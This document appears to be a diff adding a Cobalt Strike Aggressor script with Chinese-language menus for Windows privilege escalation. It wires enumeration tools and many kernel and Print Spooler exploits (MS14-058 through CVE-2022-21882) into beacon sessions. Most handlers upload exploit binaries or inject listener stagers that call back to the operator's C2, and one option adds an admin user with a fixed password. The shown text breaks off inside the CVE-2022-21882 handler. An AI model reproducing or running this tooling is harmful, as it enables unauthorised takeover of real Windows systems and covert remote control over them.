@@ -1,0 +1,1544 @@
+menu "权限提升" {
+    @plugins = ls(script_resource("plugins/escalation"));
+    foreach $plugin (@plugins) { 
+        include($plugin);
+    }
+
+    menu "CheckVuls" {
+        item "Watson" {
+            btask($1, "Windows 10 1507/1511/1607/1703/1709/1803/1809、2016 And 2019");
+            bexecute_assembly($1, script_resource("bin/escalation/CheckVuls/Watson.exe"), "");
+            # https://github.com/rasta-mouse/Watson
+        }
+        item "SharpUp" {
+            bexecute_assembly($1, script_resource("bin/escalation/CheckVuls/SharpUp.exe"), "audit");
+            # https://github.com/GhostPack/SharpUp
+        }
+        item "dazzleUP" {
+            bdllspawn($1, script_resource("bin/escalation/CheckVuls/dazzleUP_Reflective_DLL.x64.dll"), $2, "dazzleUP", 5000, false);
+            # https://github.com/hlldz/dazzleUP
+        }
+        item "WinPEAS" {
+            $bid = $1['@'];
+            $dialog = dialog("WinPEAS",%(path => "C:\\ProgramData\\out.log",bid => $bid),&WinPEAS);
+            dialog_description($dialog, "用于枚举本地提升权限的可能路径工具，需注意用户权限、tasks_max_size和.Net >= 4.5.2等问题，执行过程会有点慢，比较消耗系统性能...。");
+            drow_combobox($dialog, "options", "Options: ", @("all","domain","systeminfo","userinfo","processinfo","servicesinfo","applicationsinfo","networkinfo","windowscreds","browserinfo","filesinfo","fileanalysis","eventsinfo"));
+            drow_text($dialog, "path", "Out-File: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub WinPEAS {
+            btask($bid, "Tasked beacon to run .NET program: winPEASx64.exe");
+            btask($bid, "Args: $3['options'] quiet log=\"$3['path']\"");
+            blog($bid,"========== Runing is slow, please wait! ==========");
+            $exe = script_resource("bin/escalation/CheckVuls/winPEASx64.exe");
+
+            if ($3['options'] eq "all") {
+                bexecute_assembly!($bid, $exe, "quiet log=\"$3['path']\"");
+                # domain参数貌似也是检查所有，执行这条会比较消耗系统性能!
+            } else {
+                bexecute_assembly!($bid, $exe, "$3['options'] quiet log=\"$3['path']\"");
+            }
+            # https://github.com/peass-ng/PEASS-ng
+        }
+        item "PrivKit(x64)" {
+            local('$bid');
+            foreach $bid ($1) {
+                PrivKit($bid);
+            }
+        }
+        sub PrivKit {
+            fireAlias($1, "privcheck", "");     # 仅支持64位进程
+            # https://github.com/mertdas/PrivKit
+        }
+	    item "AccessChk" {
+            $bid = $1['@'];
+            $dialog = dialog("AccessChk",%(user => "Users", path => "C:\\*",bid => $bid),&AccessChk);
+            dialog_description($dialog, "使用AccessChk工具扫描可读写的目录，设置指定用户和扫描路径即可。");
+            drow_text($dialog, "user", "user: ");
+            drow_text($dialog, "path", "path: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+	    }
+        sub AccessChk {
+            btask($bid, "Tasked beacon upload and run: accesschk");
+            bupload!($bid, script_resource("bin/escalation/CheckVuls/accesschk.exe"));
+            fireAlias($bid, "sharpcmd", "\"accesschk /accepteula -uwds $3['user'] $3['path'] -nobanner\"");
+            # bshell($bid, "accesschk /accepteula -uwds $3['user'] $3['path'] -nobanner");
+            # https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
+        }
+    }
+
+    menu "OtherExps" {
+        menu "MS-Old-Exploits" {
+            item "MS13-046*" {
+                $bid = $1['@'];
+                $dialog = dialog("MS13-046",%(program => "C:\\ProgramData\\artifact.exe",bid => $bid),&MS13-046);
+                dialog_description($dialog, "指定CS/MSF木马上线即可（免杀处理），执行命令无回显（可能造成系统崩溃），在其他系统上利用都会出现系统崩溃，如Win10/11/2012/2019等。");
+                drow_combobox($dialog, "version", "support: ", @("Win2k3/2008"));
+                drow_text($dialog, "program", "program: ");
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS13-046 {
+                btask($bid, "Tasked beacon upload and run: MS13-046");
+                bupload!($bid, script_resource("bin/escalation/OtherExps/MSoldExps/MS13-046.exe"));     # 需手动删除这个利用工具
+                fireAlias($bid, "sharpcmd", "\"MS13-046 $3['program']\"");
+            }
+            item "MS14-058" {
+                $bid = $1['@'];
+                $dialog = dialog("MS14-058",%(bid => $bid),&MS14-058);
+                dialog_description($dialog, "CVE-2014-4113，一个本地权限升级漏洞，可以使用它获得Win2k3/2008系统权限，Win2k12系统会蓝屏崩溃。");
+                drow_listener_stage($dialog, "listener", "listener: ");
+                drow_combobox($dialog, "version", "support: ", @("Win2k3/2008"));
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS14-058 {
+                local('$stager $arch $spawn $dll');
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2014-4113");
+                blog($bid, "=========CVE-2014-4113 exploits elevate=============");
+                blog($bid, "CVE-2014-4113 exploits elevate");
+                blog($bid, "good luck!!!!!!!!!");
+
+                if (-is64 $bid) {
+                    $arch = "x64";
+                    $spawn = "%windir%\\sysnative\\msiexec.exe";
+                    $dll =  script_resource("bin/escalation/OtherExps/MSoldExps/MS14-058.x64.dll");
+                } else {
+                    $arch = "x86";
+                    $spawn = "%windir%\\syswow64\\msiexec.exe";
+                    $dll =  script_resource("bin/escalation/OtherExps/MSoldExps/MS14-058.x86.dll");
+                }
+
+                bspawnto!($bid, $arch, $spawn);
+                $stager = payload($3['listener'], $arch, "thread", "Direct");
+                bdllspawn!($bid, $dll, $stager, "CVE-2014-4113", 5000);
+                beacon_link($bid, $null, $3['listener']);
+                bspawnto!($bid, $arch, "");
+            }
+            item "MS15-010" {
+                $bid = $1['@'];
+                $dialog = dialog("MS15-010",%(command => "whoami",bid => $bid),&MS15-010);
+                dialog_description($dialog, "CVE-2015-0057，内核模式驱动程序的win32k.sys允许本地用户通过前述设计的应用程序获得特权。");
+                drow_combobox($dialog, "version", "support: ", @("Win2k3/2008"));
+                drow_text($dialog, "command", "command: ");
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS15-010 {
+                btask($bid, "Tasked beacon upload and run: MS15-010");
+                bupload!($bid, script_resource("bin/escalation/OtherExps/MSoldExps/MS15-010.exe"));
+                fireAlias($bid, "sharpcmd", "\"MS15-010 $3['command']\"");
+            }
+            item "MS15-015" {
+                $bid = $1['@'];
+                $dialog = dialog("MS15-015",%(command => "whoami",bid => $bid),&MS15-015);
+                dialog_description($dialog, "CVE-2015-0062，当Microsoft Windows无法正确验证和强制执行模拟级别时存在特权提升漏洞。");
+                drow_combobox($dialog, "version", "support: ", @("Win2k8/2012"));
+                drow_combobox($dialog, "options", "options: ", @("command","mem-cmd"));
+                drow_text($dialog, "command", "command: ");
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS15-015 {
+                if ($3['options'] eq "command") {
+                    btask($bid, "Tasked beacon upload and run: MS15-015");
+                    bupload!($bid, script_resource("bin/escalation/OtherExps/MSoldExps/MS15-015.exe"));
+                    fireAlias($bid, "sharpcmd", "\"MS15-015 $3['command']\"");
+                } else {
+                    bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/MS15-015-runcmd.dotnet.exe"));
+                }
+            }
+            item "MS15-051" {
+                $bid = $1['@'];
+                $dialog = dialog("MS15-051",%(bid => $bid),&MS15-051);
+                dialog_description($dialog, "CVE-2015-1701，Windows内核模式驱动程序的漏洞可能允许特权提升（3057191）。");
+                drow_listener_stage($dialog, "listener", "listener: ");
+                drow_combobox($dialog, "version", "support: ", @("Win2k3/2008"));
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS15-051 {
+                local('$arch $dll $stager');
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2015-1701");
+                blog($bid, "=========CVE-2015-1701 exploits elevate=============");
+                blog($bid, "CVE-2015-1701 exploits elevate");
+                blog($bid, "good luck!!!!!!!!!");
+
+                if (-is64 $bid) {
+                    $arch = "x64";
+                    $dll = script_resource("bin/escalation/OtherExps/MSoldExps/MS15-051.x64.dll");
+                }
+                else {
+                    $arch = "x86";
+                    $dll = script_resource("bin/escalation/OtherExps/MSoldExps/MS15-051.x86.dll");
+                }
+
+                $stager = payload($3['listener'], $arch, "thread", "Direct");
+                bdllspawn!($bid, $dll, $stager, "MS15-051", 5000);
+                beacon_link($bid, $null, $3['listener']); 
+                # bstage($bid, $null, $3['listener'], $arch);     # 4.0已弃用bstage
+            }
+            item "MS15-077" {
+                $bid = $1['@'];
+                $dialog = dialog("MS15-077",%(command => "whoami",bid => $bid),&MS15-077);
+                dialog_description($dialog, "CVE-2015-2387，ATM字体驱动程序的漏洞可能允许特权提升，Win7/2003/2008 x86和2012 x64已在本地复现成功。");
+                drow_combobox($dialog, "version", "support: ", @("Win7/2003/2008/2012"));
+                drow_text($dialog, "command", "command: ");
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS15-077 {
+                btask($bid, "Tasked beacon upload and run: MS15-077");
+                bupload!($bid, script_resource("bin/escalation/OtherExps/MSoldExps/MS15-077.x86.exe"));
+                fireAlias($bid, "sharpcmd", "\"MS15-077.x86.exe $3['command']\"");
+            }
+            item "MS16-014" {
+                $bid = $1['@'];
+                $dialog = dialog("MS16-014",%(command => "whoami",bid => $bid),&MS16-014);
+                dialog_description($dialog, "CVE-2016-0040，当Windows内核不正确地处理内存中的对象时存在特权提升漏洞。");
+                drow_combobox($dialog, "version", "support: ", @("Win7/Win2k8"));
+                drow_combobox($dialog, "options", "options: ", @("command","mem-who","mem-cmd"));
+                drow_text($dialog, "command", "command: ");
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS16-014 {
+                if ($3['options'] eq "command") {
+                    btask($bid, "Tasked beacon upload and run: MS16-014");
+                    bupload!($bid, script_resource("bin/escalation/OtherExps/MSoldExps/MS16-014.exe"));
+                    fireAlias($bid, "sharpcmd", "\"MS16-014 $3['command']\"");
+
+                    # 根据当前Beacon arch上传对应exp并执行
+                    # local('$arch $exe');
+                    # if (-is64 $bid) {
+                    #    $arch = "x64";
+                    #    $exe = script_resource("bin/escalation/MemoryPE/MS16-014_x64.exe");
+                    # }
+                    # else {
+                    #     $arch = "x86";
+                    #     $exe = script_resource("bin/escalation/MemoryPE/MS16-014_x86.exe");
+                    # }
+                    # bupload!($bid, $exe);
+                    # bshell($bid, "MS16-014_ $+ $arch \"$3['command']\"");
+                    # bshell($bid, "taskkill /f /im MS16-014_ $+ $arch $+ .exe");
+                    # bshell($bid, "del /f /s /q MS16-014_ $+ $arch $+ .exe");
+                }
+                if ($3['options'] eq "mem-who") {
+                    bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/MS16-014-whoami.dotnet.exe"));
+                }
+                if ($3['options'] eq "mem-cmd") {
+                    bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/MS16-014-runcmd.dotnet.exe"));
+                }
+            }
+            item "MS16-016" {
+                $bid = $1['@'];
+                $dialog = dialog("MS16-016",%(bid => $bid),&MS16-016);
+                dialog_description($dialog, "CVE-2016-0051，mrxdav.sys WebDav本地提权，仅支持Windows 7 SP1 x86利用，已在本地复现成功。");
+                drow_listener_stage($dialog, "listener", "listener: ");
+                drow_combobox($dialog, "version", "support: ", @("Win7 SP1 x86"));
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS16-016 {
+                local('$stager');
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2016-0051");
+                blog($bid, "=========CVE-2016-0051 exploits elevate=============");
+                blog($bid, "CVE-2016-0051 exploits elevate");
+                blog($bid, "good luck!!!!!!!!!");
+
+                if (-is64 $bid) {
+                    berror($bid, "MS16-016 exploit is Windows7 SP1 x86 only");
+                    return;
+                }
+
+                $stager = payload($3['listener'], "x86", "thread", "Direct");
+                bdllspawn!($bid, script_resource("bin/escalation/OtherExps/MSoldExps/MS16-016.x86.dll"), $stager, "MS16-016", 5000);
+                beacon_link($bid, $null, $3['listener']); 
+            }
+            item "MS16-032" {
+                $bid = $1['@'];
+                $dialog = dialog("MS16-032",%(command => "whoami",bid => $bid),&MS16-032);
+                dialog_description($dialog, "CVE-2016-0099只能在SERVICE使用，如果Windows辅助登录服务无法正确管理内存中的请求句柄，则Microsoft Windows中存在特权提升漏洞。");
+                drow_combobox($dialog, "version", "support: ", @("Win2k3/2008/2012"));
+                drow_combobox($dialog, "options", "options: ", @("command","mem-who","mem-cmd"));
+                drow_text($dialog, "command", "command: ");
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS16-032 {
+                if ($3['options'] eq "command") {
+                    btask($bid, "Tasked beacon upload and run: MS16-032");
+                    bupload!($bid, script_resource("bin/escalation/OtherExps/MSoldExps/MS16-032.exe"));
+                    fireAlias($bid, "sharpcmd", "\"MS16-032 $3['command']\"");
+                }
+                if ($3['options'] eq "mem-who") {
+                    bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/MS16-032-whoami.dotnet.exe"));
+                }
+                if ($3['options'] eq "mem-cmd") {
+                    bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/MS16-032-runcmd.dotnet.exe"));
+                }
+            }
+            item "MS16-034" {
+                $bid = $1['@'];
+                $dialog = dialog("MS16-034",%(bid => $bid),&MS16-034);
+                dialog_description($dialog, "CVE-2016-0095漏洞的原理是空指针解引用，导致Win32k内核提权漏洞的产生；默认会优先执行当前目录下的cmd.exe，执行多次可能会出现蓝屏重启。");
+                drow_combobox($dialog, "version", "support: ", @("Win7/Win2k8"));
+                drow_combobox($dialog, "options", "options: ", @("command","mem-cmd"));
+                dbutton_action($dialog, "确定");
+                dialog_show($dialog);
+            }
+            sub MS16-034 {
+                local('$arch $exe $csharp');
+
+                if (-is64 $bid) {
+                    $arch = "x64";
+                    $exe = script_resource("bin/escalation/OtherExps/MSoldExps/MS16-034_x64.exe");
+                    $csharp = script_resource("bin/escalation/OtherExps/PEzor/MS16-034_x64-runcmd.dotnet.exe");
+                } else {
+                    $arch = "x86";
+                    $exe = script_resource("bin/escalation/OtherExps/MSoldExps/MS16-034_x86.exe");
+                    $csharp = script_resource("bin/escalation/OtherExps/PEzor/MS16-034_x86-runcmd.dotnet.exe");
+                }
+
+                if ($3['options'] eq "command") {
+                    btask($bid, "Tasked beacon upload and run: MS16-034");
+                    bupload!($bid, $exe);
+                    fireAlias($bid, "sharpcmd", "\"MS16-034_ $+ $arch $+ .exe\"");
+                } else {
+                    bexecute_assembly($bid, $csharp);
+                }
+            }
+        }
+        item "CVE-2017-0213" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2017-0213",%(command => "whoami",bid => $bid),&CVE-2017-0213);
+            dialog_description($dialog, "一个比较冷门的COM类型混淆Type Confusion漏洞，巧妙的利用该漏洞可以实现本地的提权。");
+            drow_combobox($dialog, "version", "support: ", @("Win2k8/2012/2016"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2017-0213 {
+            btask($bid, "Tasked beacon upload and run: CVE-2017-0213");
+            bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2017-0213.exe"));
+            fireAlias($bid, "sharpcmd", "\"CVE-2017-0213 $3['command']\"");
+            bshell($bid, "del /f /s /q CVE-2017-0213.exe run.sct");
+        }
+        item "CVE-2018-0824" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2018-0824",%(command => "",bid => $bid),&CVE-2018-0824);
+            dialog_description($dialog, "默认执行当前目录下的cmd.exe，需将CS/MSF免杀木马文件名改为cmd.exe即可提升权限。");
+            drow_combobox($dialog, "version", "support: ", @("Win2k8"));
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2018-0824 {
+            btask($bid, "Tasked beacon upload and run: CVE-2018-0824");
+            bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2018-0824.exe"));      # 改用MTd编译模式
+            fireAlias($bid, "sharpcmd", "CVE-2018-0824");
+            bshell($bid, "del /f /s /q CVE-2018-0824.exe run.sct");
+        }
+        item "CVE-2018-8120" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2018-8120",%(command => "whoami",bid => $bid),&CVE-2018-8120);
+            dialog_description($dialog, "执行多次可能出现蓝屏重启，该漏洞源于Win32k组件NtUserSetImeInfoEx函数内部SetImeInfoEx函数的没有正确的处理内存中的空指针对象。");
+            drow_combobox($dialog, "version", "support: ", @("Win7/Win2k3/2008"));
+            drow_combobox($dialog, "options", "options: ", @("command","mem-who","mem-cmd"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2018-8120 {
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: CVE-2018-8120");
+                bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2018-8120.exe"));
+                fireAlias($bid, "sharpcmd", "\"CVE-2018-8120 $3['command']\"");
+            }
+            if ($3['options'] eq "mem-who") {
+                bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/CVE-2018-8120-whoami.dotnet.exe"));
+            }
+            if ($3['options'] eq "mem-cmd") {
+                bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/CVE-2018-8120-runcmd.dotnet.exe"));
+            }
+        }
+        item "CVE-2018-8639" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2018-8639",%(command => "whoami",bid => $bid),&CVE-2018-8639);
+            dialog_description($dialog, "部分环境可能也会蓝屏，未正确处理窗口类成员对象导致的Double-free类型本地权限提升漏洞。");
+            drow_listener_stage($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win7/Win2k8"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode","mem-cmd"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2018-8639 {
+            local('$dll $stager');
+            $dll =  script_resource("bin/escalation/OtherExps/CVE-2018-8639.dll");
+
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: CVE-2018-8639");
+                bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2018-8639.exe"));
+                fireAlias($bid, "sharpcmd", "\"CVE-2018-8639 $3['command']\"");
+            } 
+            if ($3['options'] eq "shellcode") {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2018-8639");
+                blog($bid, "=========CVE-2018-8639 exploits elevate=============");
+                blog($bid, "CVE-2018-8639 exploits elevate");
+                blog($bid, "good luck!!!!!!!!!");
+                $stager = payload($3['listener'], barch($bid), "thread", "Direct");
+                bdllspawn!($bid, $dll, $stager, "CVE-2018-8639", 5000);
+                beacon_link($bid, $null, $3['listener']);
+            }
+            if ($3['options'] eq "mem-cmd") {
+                bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/CVE-2018-8639-runcmd.dotnet.exe"));
+            }
+        }
+        item "CVE-2019-0803" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2019-0803",%(program => "C:\\ProgramData\\artifact.exe",bid => $bid),&CVE-2019-0803);
+            dialog_description($dialog, "利用过程有些慢，默认优先执行当前目录下的cmd.exe，也可指定要执行的文件；如果失败时可尝试多执行几次，或结束该进程后再次执行。");
+            drow_combobox($dialog, "version", "support: ", @("Win7/Win2k8"));
+            drow_text($dialog, "program", "program: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2019-0803 {
+            btask($bid, "Tasked beacon upload and run: CVE-2019-0803");
+            bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2019-0803.exe"));    # 需手动结束进程并删除这个利用工具
+            fireAlias($bid, "sharpcmd", "\"CVE-2019-0803 cmd $3['program']\"");
+        }
+        item "CVE-2019-0808" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2019-0808",%(bid => $bid),&CVE-2019-0808);
+            dialog_description($dialog, "偶尔也会出现蓝屏重启，默认执行当前目录下的cmd.exe，将CS/MSF免杀木马文件名改为cmd.exe即可提升权限，个别环境可能缺少DLL。");
+            drow_combobox($dialog, "version", "support: ", @("Win7/Win2k8"));
+            drow_combobox($dialog, "options", "options: ", @("command","mem-cmd"));
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2019-0808 {
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: CVE-2019-0808");
+                bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2019-0808.exe"));
+                fireAlias($bid, "sharpcmd", "CVE-2019-0808");
+            } else {
+                bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/CVE-2019-0808-runcmd.dotnet.exe"));
+            }
+        }
+        item "CVE-2019-1458*" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2019-1458",%(command => "whoami",bid => $bid),&CVE-2019-1458);
+            dialog_description($dialog, "极易造成内核崩溃蓝屏重启，请谨慎使用！！！每次内核重启只有1次利用机会，仅支持x64系统。");
+            drow_combobox($dialog, "version", "support: ", @("Win2k8/2012"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2019-1458 {
+            btask($bid, "Tasked beacon upload and run: CVE-2019-1458");
+            bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2019-1458.exe"));
+            bshell($bid, "CVE-2019-1458 \"$3['command']\"");
+            # https://github.com/rip1s/CVE-2019-1458
+        }
+        item "CVE-2020-0796" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2020-0796",%(bid => $bid),&CVE-2020-0796);
+            dialog_description($dialog, "这个漏洞仅支持Windows 10 x64版本1903-1909，补丁：KB4551762，已在本地复现成功！");
+            drow_listener_stage($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10 x64 1903-1909"));
+            drow_combobox($dialog, "options", "options: ", @("Reflective DLL","Beacon Object File"));
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2020-0796 {
+	        local('$winbuild $stager $handle $exploit');
+            btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2020-0796");
+
+	        $winbuild = binfo($bid, "build");
+            blog($bid, "Current Windows OS Build: $winbuild");
+	        if ($winbuild != '9200' && $winbuild != '9600' && $winbuild != '18362' && $winbuild != '18363') {
+		        berror($bid, "This exploit only supports Windows 10 versions 1903 - 1909");
+		        return;
+	        }
+
+	        if (!-is64 $bid) {
+		        berror($bid, "CVE-2020-0796 exploit is x64 only");
+		        return;
+	        }
+
+            if ($3['options'] eq "Reflective DLL") {
+	            $stager = payload_local($bid, $3['listener'], "x64", "thread");
+	            $stager = pack("I-", strlen($stager)) . $stager;
+	            bdllspawn!($bid, getFileProper(script_resource("bin/escalation/OtherExps"), "CVE-2020-0796.x64.dll"), $stager, "CVE-2020-0796", 5000);
+	            beacon_link($bid, $null, $3['listener']);
+                # https://github.com/rsmudge/ElevateKit
+            } else {
+	            $stager = payload_local($bid, $3['listener'], "x64", "thread");
+	            $handle  = openf(script_resource("bin/escalation/OtherExps/CVE-2020-0796.x64.o"));
+	            $exploit = readb($handle, -1);
+	            closef($handle); 
+	            beacon_inline_execute($bid, $exploit, "elevate", $stager);
+                beacon_link($bid, $null, $3['listener']);
+                # https://github.com/rsmudge/CVE-2020-0796-BOF
+            }
+        }
+        item "CVE-2021-1675" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2021-1675",%(dllpath => "C:\\Windows\\Temp\\AddUser.dll",bid => $bid),&CVE-2021-1675);
+            dialog_description($dialog, "Windows Print Spooler后台处理程序服务中远程代码执行漏洞；返回0利用成功，dll会注入到spoolsv.exe进程，在执行多次后该服务可能会被停止（无法再次利用）。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win2k16"));
+            drow_combobox($dialog, "options", "options: ", @("shellcode","customdll"));
+            drow_file($dialog, "dllfile", "updllfile: ");
+            # drow_text($dialog, "dllpath", "dll path: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2021-1675 {
+            local('$temp $arch $dll $dlldata');
+            $temp = "C:\\Windows\\System32\\spool\\drivers\\color\\" . Getname() . ".dll";
+
+            if (-is64 $bid) {
+                $arch = "x64";
+                $dll =  script_resource("bin/escalation/OtherExps/CVE-2021-1675.x64.dll");
+            } else {
+                $arch = "x86";
+                $dll =  script_resource("bin/escalation/OtherExps/CVE-2021-1675.x86.dll");
+            }
+
+            if ($3['options'] eq "shellcode") {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2021-1675");
+                blog($bid, "=========CVE-2021-1675 exploits elevate=============");
+                blog($bid, "exploit dll use mstxq17 CVE-2021-1675 ReflectiveLoader dll");
+                blog($bid, "test success targer system winserver16");
+                blog($bid, "good luck!!!!!!!!!");
+
+                $dll = getFileProper(script_resource("bin/escalation/OtherExps"), "CVE-2021-1675.dll");
+                $dlldata = artifact_payload($3['listener'], "dll", $arch);
+                bupload_raw!($bid, $temp, $dlldata);
+                btask($bid, "Stageless uploading to: $temp");
+                blog($bid, "Manual deletion: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\*.dll");
+                bdllspawn!($bid, $dll, $temp, "Local Privilege Escalation of CVE-2021-1675", 5000, true);
+                # https://github.com/mstxq17/CVE-2021-1675_RDL_LPE
+            }  else {
+                btask($bid, "Tasked beacon run: CVE-2021-1675 [Custom DLL Path]");
+                blog($bid, "=========CVE-2021-1675 exploits elevate=============");
+                blog($bid, "AddUser.dll Username: admin, Password: Passw0rd!");
+                blog($bid, "Manual deletion: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\*.dll");
+                fireAlias($bid, "upload", "$3['dllfile'] $temp");
+                bdllspawn!($bid, $dll, $temp, "Local Privilege Escalation of CVE-2021-1675", 5000, true);
+                brm!($bid, $temp);  # 删除上传的dll文件，执行会注入到spoolsv.exe进程
+            }
+        }
+        item "CVE-2021-1732*" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2021-1732",%(command => "whoami",bid => $bid),&CVE-2021-1732);
+            dialog_description($dialog, "Win10本地提权漏洞，仅在Win10 1809/1909、Win2k19 x64测试成功，其他系统或执行多次都可能蓝屏。");
+            drow_combobox($dialog, "version", "support: ", @("Win10 x64 ≤1909/Win2k19"));
+            drow_combobox($dialog, "options", "options: ", @("command","mem-who","mem-cmd"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2021-1732 {
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: CVE-2021-1732");
+                bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2021-1732.exe"));   # 改用MTd编译模式
+                fireAlias($bid, "sharpcmd", "\"CVE-2021-1732 $3['command']\"");
+                # https://github.com/KaLendsi/CVE-2021-1732-Exploit
+            }
+            if ($3['options'] eq "mem-who") {
+                bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/CVE-2021-1732-whoami.dotnet.exe"));
+            }
+            if ($3['options'] eq "mem-cmd") {
+                bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/CVE-2021-1732-runcmd.dotnet.exe"));
+            }
+        }
+        item "CVE-2021-40449" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2021-40449",%(bid => $bid),&CVE-2021-40449);
+            dialog_description($dialog, "内核模块win32kfull.sys中存在UAF漏洞，利用此漏洞可实现本地权限提升，@IIX Fiber师傅已复现测试。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win2k16/2019"));
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2021-40449 {
+            local('$stager');
+            $dll =  script_resource("bin/escalation/OtherExps/CVE-2021-40449.x64.dll");
+
+            if (!-is64 $bid) {
+                berror($bid, "CVE-2021-40449 exploit is x64 only");
+                return;
+            }
+
+            btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2021-40449");
+            blog($bid, "=========CVE-2021-40449 exploits elevate=============");
+            blog($bid, "exploit dll use metasploit CVE-2021-40449 ReflectiveLoader dll");
+            blog($bid, "CVE-2021-40449 exploits elevate");
+            blog($bid, "test success targer system winserver16 winserver19 win10");
+            blog($bid, "good luck!!!!!!!!!");
+            $stager = payload_local($bid, $3['listener'], "x64", "thread");
+            $stager = pack("I-", strlen($stager)) . $stager;
+            bdllspawn!($bid, $dll, $stager, "CVE-2021-40449", 5000);
+            beacon_link($bid, $null, $3['listener']);
+        }
+        item "CVE-2022-21882*" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2022-21882",%(command => "whoami",bid => $bid),&CVE-2022-21882);
+            dialog_description($dialog, "Windows 10本地提权漏洞，绕过CVE-2021-1732补丁，仅在Windows 10 20h2 19042.1415测试，其他系统或执行多次都可能蓝屏重启。");
+            drow_combobox($dialog, "version", "support: ", @("Win10 x64 ≥20h2"));
+            drow_combobox($dialog, "options", "options: ", @("command","mem-who","mem-cmd"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2022-21882 {
+            local('$winbuild');
+            $winbuild = binfo($bid, "build");
+            blog($bid, "Current Windows OS Build: $winbuild");
+
+            if ($winbuild != '19042' && $winbuild != '19043' && $winbuild != '19044' && $winbuild != '19045') {
+                berror($bid, "This exploit only supports Windows 10 x64 ≥20h2 Series System");
+                return;
+            }
+
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: CVE-2022-21882");
